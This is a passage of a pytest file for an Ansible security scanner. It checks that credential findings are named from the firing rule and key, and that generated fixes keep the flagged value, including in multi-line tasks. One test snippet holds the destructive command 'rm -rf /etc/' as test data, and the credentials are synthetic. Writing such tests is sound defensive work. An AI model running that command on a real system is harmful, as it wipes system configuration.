            out = self._render(gen, rule_id, "shell: rm -rf /etc/")
            assert _SECURE_FIX_BLOCK_RE.search(out), (
                f"{rule_id}: no Secure Fix block - dispatch regressed"
            )


class TestCredentialTypeLabelling:
    """A credential finding is named from the rule that fired, then the
    flagged key, never guessed from the value. That guessing is what
    labelled every ``token:`` line a JWT and produced the vague "Access
    Token" catch-all; both are gone. A specific rule names itself
    (``splunk_hec_token_literal`` -> "Splunk HEC Token"); a generic rule
    borrows the key (``okta_api_token:`` -> "Okta API Token").
    """

    _HEC_UUID = _SYNTHETIC_UUID
    _REAL_JWT = _SYNTHETIC_JWT

    @pytest.fixture(scope="class")
    def base(self) -> BaseRemediationGenerator:
        return BaseRemediationGenerator()

    @pytest.mark.parametrize(
        "rule_id,snippet,expected_name",
        [
            ("splunk_hec_token_literal", f'token: "{_HEC_UUID}"', "Splunk HEC Token"),
            ("okta_api_token_literal", f'token: "{_HEC_UUID}"', "Okta API Token"),
            ("aws_access_key", 'aws_access_key: "AKIA1234567890ABCD"', "AWS Access Key"),
            ("stripe_live_secret_key_literal", 'k: "sk_live_x"', "Stripe Live Secret Key"),
            ("github_personal_access_token_literal", 'k: "ghp_x"', "GitHub Personal Access Token"),
            ("hardcoded_token", f'okta_api_token: "{_HEC_UUID}"', "Okta API Token"),
            ("hardcoded_password", 'db_password: "hunter2hunter2"', "Db Password"),
            ("jwt_token", f'token: "{_REAL_JWT}"', "JWT Token"),
        ],
    )
    def test_identity_comes_from_rule_then_key(self, base, rule_id, snippet, expected_name):
        family = base._detect_credential_type(snippet, rule_id)
        info = base._get_credential_type_info(family, rule_id=rule_id, code_snippet=snippet)
        assert info["name"] == expected_name, (
            f"{rule_id} / {snippet!r} named {info['name']!r}, expected {expected_name!r}"
        )

    def test_bare_token_is_not_labelled_jwt(self, base):
        """The exact regression: a UUID token value must not read as a JWT."""
        family = base._detect_credential_type(f'token: "{self._HEC_UUID}"', "hardcoded_token")
        info = base._get_credential_type_info(
            family, rule_id="hardcoded_token", code_snippet=f'okta_api_token: "{self._HEC_UUID}"'
        )
        assert "JWT" not in info["name"], info

    def test_every_credential_rule_labels_non_jwt_correctly(
        self, remediation_generator: RemediationGenerator
    ):
        """Semantic-label coverage across every credential-routed rule: a
        finding whose value is not a JWT must never render 'JWT Token
        Detected', and no rule may fall back to a generic guessed label.
        This is the assertion that catches the whole class of mislabels,
        not just the one rule that surfaced it.
        """

        cred_ids = [
            rid
            for rid in sorted(known_rule_ids())
            if resolve_category(rid) == "hardcoded_credentials"
        ]
        assert cred_ids, "no credential rules resolved; category map regressed"

        mislabelled: list[str] = []
        generic: list[str] = []
        for rid in cred_ids:
            snippet = f'{rid}: "{self._HEC_UUID}"'
            out = remediation_generator.generate_remediation_example(rid, snippet) or ""
            if "JWT Token Detected" in out and rid != "jwt_token":
                mislabelled.append(rid)
            # The retired catch-all rendered exactly this header. A real vendor
            # name ("Facebook Access Token") is fine; the bare label is not.
            if "\U0001f6a8 Access Token Detected:" in out:
                generic.append(rid)

        assert not mislabelled, (
            "these credential rules render 'JWT Token Detected' for a non-JWT "
            f"(UUID) value, which is wrong: {mislabelled}"
        )
        assert not generic, (
            "these credential rules fall back to the retired bare 'Access Token' "
            f"label instead of naming the credential from the rule/key: {generic}"
        )

    def test_every_credential_rule_generates_a_grounded_fix(
        self, remediation_generator: RemediationGenerator
    ):
        """Every credential rule must generate a fix built from the finding's
        real key and value, never a placeholder. A leaked ``VARIABLE_NAME`` or
        a ``vault_variable_name`` var means the extractor fell through to its
        sentinel instead of reading the flagged line.
        """

        cred_ids = [
            rid
            for rid in sorted(known_rule_ids())
            if resolve_category(rid) == "hardcoded_credentials"
        ]
        assert cred_ids, "no credential rules resolved; category map regressed"

        key = "okta_api_token"
        ungrounded: list[str] = []
        for rid in cred_ids:
            snippet = f'    {key}: "{self._HEC_UUID}"'
            out = remediation_generator.generate_remediation_example(rid, snippet) or ""
            if (
                "VARIABLE_NAME" in out
                or "vault_variable_name" in out
                or "your_actual_credential" in out
                or key not in out
                or self._HEC_UUID not in out
            ):
                ungrounded.append(rid)

        assert not ungrounded, (
            "these credential rules emit a placeholder or drop the finding's real "
            f"key/value from the generated fix: {ungrounded}"
        )

    def test_every_credential_rule_stays_grounded_in_a_task_window(
        self, remediation_generator: RemediationGenerator
    ):
        """The live scan feeds the enclosing task, not the bare line. Every
        credential rule must still ground on the flagged ``token:`` line and
        ignore the surrounding ``url:``/``name:`` lines, with no placeholder.
        """

        cred_ids = [
            rid
            for rid in sorted(known_rule_ids())
            if resolve_category(rid) == "hardcoded_credentials"
        ]
        assert cred_ids, "no credential rules resolved; category map regressed"

        ungrounded: list[str] = []
        for rid in cred_ids:
            task = (
                "- name: Register external destination\n"
                "  uri:\n"
                '    url: "https://api.example.com/v1/register"\n'
                "    body:\n"
                f'      okta_api_token: "{self._HEC_UUID}"'
            )
            out = remediation_generator.generate_remediation_example(
                rid, task, display_snippet=task
            )
            if "VARIABLE_NAME" in out or self._HEC_UUID not in out:
                ungrounded.append(rid)

        assert not ungrounded, (
            "these credential rules emit a placeholder or drop the flagged value "
            f"when handed a multi-line task window: {ungrounded}"
        )


class TestCredentialContextIdentity:
    """A credential finding in a real task is a multi-line snippet: the flagged
    ``token:`` line sits under a ``url:`` and a ``name:``. Identity, value
    extraction, and the env var must all target the credential line, and
    context that only appears in surrounding lines (a Splunk HEC endpoint, a
    real JWT) must still drive the family. This is the path a live scan takes,
    so these are the assertions that catch the mislabels users actually see.
    """

    _UUID = _SYNTHETIC_UUID
    _REAL_JWT = _SYNTHETIC_JWT

    @pytest.fixture(scope="class")
    def base(self) -> BaseRemediationGenerator:
        return BaseRemediationGenerator()

    def _hec_task(self, token: str) -> str:
        return (
            "- name: Configure Splunk HEC destination\n"
            "  uri:\n"
            '    url: "http://localhost:8081/api/hec/destinations"\n'
            "    method: POST\n"
            "    body:\n"
            '      url: "{{ SPLUNK_CLOUD_url }}:8088/services/collector"\n'
            f'      token: "{token}"'
        )

    def test_identity_from_key_targets_the_credential_line(self, base):
        """A multi-line task names the flagged secret, not the first url:/name:."""
        from ansible_security_scanner.remediations.base import _identity_from_key

        assert _identity_from_key(self._hec_task(self._UUID)) == "Token"

    def test_hec_context_upgrades_a_generic_token_rule(
        self, remediation_generator: RemediationGenerator
    ):
        """A generic ``hardcoded_token`` in an HEC task reads as an HEC token,
        with HEC advice, because the context is now fed to generation.
        """
        task = self._hec_task(self._UUID)
        out = remediation_generator.generate_remediation_example(
            "hardcoded_token", task, display_snippet=task
        )
        assert "Splunk HEC Token Detected" in out, out
        assert "HTTP Event Collector" in out, out

    def test_multiline_fix_grounds_on_the_credential_line(
        self, remediation_generator: RemediationGenerator
    ):
        """Value, vault var, and env var are all built from ``token:``, never
        the earlier ``url:`` line, and no placeholder leaks through.
        """
        task = self._hec_task(self._UUID)
        out = remediation_generator.generate_remediation_example(
            "hardcoded_token", task, display_snippet=task
        )
        assert self._UUID in out, out
        assert "VARIABLE_NAME" not in out, out
        assert "lookup('env', 'TOKEN')" in out, out
        assert "services/collector" not in out.split("Secure Fix")[-1], (
            "the fix must reference the token, not the surrounding url: line"
        )

    def test_real_jwt_in_context_still_reads_as_jwt(
        self, remediation_generator: RemediationGenerator
    ):
        task = (
            "- name: Call API\n"
            "  uri:\n"
            '    url: "https://api.example.com"\n'
            f'    headers:\n      Authorization: "Bearer {self._REAL_JWT}"'
        )
        out = remediation_generator.generate_remediation_example(
            "hardcoded_token", task, display_snippet=task
        )
        assert "JWT Token Detected" in out, out

    def test_inline_shell_assignment_does_not_clobber_the_credential(
        self, remediation_generator: RemediationGenerator
    ):
        """A bare ``VAR=value`` elsewhere in the task (an inline shell command)
        must not overwrite the flagged YAML credential during extraction.
        """
        task = (
            f'- name: Deploy\n  shell: FOO=bar ./deploy.sh\n  vars:\n    api_token: "{self._UUID}"'
        )
        out = remediation_generator.generate_remediation_example(
            "hardcoded_token", task, display_snippet=task
        )
        assert "FOO" not in out.split("Secure Fix")[-1], out
        assert "api_token" in out, out
        assert self._UUID in out, out

    def test_variable_name_extractor_targets_credential_line_in_multiline(self):
        """The name fallback used when file context is unavailable must pick the
        credential key on a multi-line snippet, not the leading ``url:`` line.
        """
        from ansible_security_scanner.variable_extractor import VariableExtractor

        ve = VariableExtractor()
        snippet = (
            f'    url: "http://api.example.com/hec"\n    method: POST\n    token: "{self._UUID}"'
        )
        assert ve.extract_variable_name(snippet, "hardcoded_credentials") == "token"

    def test_unrelated_export_word_does_not_pick_env_fix_shape(
        self, remediation_generator: RemediationGenerator
    ):
        """A YAML credential in a task that also contains the word ``export``
        on an unrelated shell line must still get the YAML vault fix, not the
        ``/etc/environment`` shape. The fix branches on the extracted
        credential kind, not on substrings anywhere in the task.
        """
        task = (
            "- name: Configure and register token\n"
            "  shell: export PATH=/opt/bin:$PATH && ./run.sh\n"
            "  vars:\n"
            f'    api_token: "{self._UUID}"'
        )
        out = remediation_generator.generate_remediation_example(
            "hardcoded_token", task, display_snippet=task
        )
        secure = out.split("Secure Fix")[1].split("Alternative")[0]
        assert "/etc/environment" not in secure, secure
        assert "api_token" in secure, secure

    def test_equals_in_task_does_not_drop_the_credential(
        self, remediation_generator: RemediationGenerator
    ):
        """A stray ``=`` elsewhere in the task (``mode=0600``) must not send the
        fix down the generic path that emits the ``variable_name`` sentinel.
        """
        task = (
            "- name: write secret file mode=0600\n"
            "  copy:\n"
            '    content: "x"\n'
            "  vars:\n"
            f'    db_secret: "{self._UUID}"'
        )
        out = remediation_generator.generate_remediation_example(
            "hardcoded_secret", task, display_snippet=task
        )
        assert "variable_name" not in out, out
        assert "db_secret" in out, out
        assert self._UUID in out, out

    def test_every_credential_rule_survives_an_adversarial_task(
        self, remediation_generator: RemediationGenerator
    ):
        """Class-wide fuzz: a task that leads with ``url:``, carries an
        unrelated ``export``/``=`` shell line, and puts the credential last must
        never produce a placeholder, drop the value, or ground the fix on the
        URL instead of the credential. This is the assertion that catches the
        whole 'written for single-line, fed multi-line' bug class, not one rule.
        """

        cred_ids = [
            rid
            for rid in sorted(known_rule_ids())
            if resolve_category(rid) == "hardcoded_credentials"
        ]
        assert cred_ids, "no credential rules resolved; category map regressed"

        task = (
            "- name: Register external destination\n"
            "  shell: export TMP=/x && ./run.sh mode=0600\n"
            "  uri:\n"
            '    url: "http://api.example.com/v1/register"\n'
            "    body:\n"
            f'      api_token: "{self._UUID}"'
        )
        placeholder: list[str] = []
        dropped: list[str] = []
        url_grounded: list[str] = []
        for rid in cred_ids:
            out = remediation_generator.generate_remediation_example(
                rid, task, display_snippet=task
            )
            if "VARIABLE_NAME" in out or "variable_name:" in out:
                placeholder.append(rid)
            if self._UUID not in out:
                dropped.append(rid)
            if "Applies to the flagged finding: http" in out:
                url_grounded.append(rid)

        assert not placeholder, f"placeholder leaked under adversarial task: {placeholder}"
        assert not dropped, f"flagged value dropped under adversarial task: {dropped}"
        assert not url_grounded, (
            f"fix grounded on the incidental url: instead of the credential: {url_grounded}"
        )
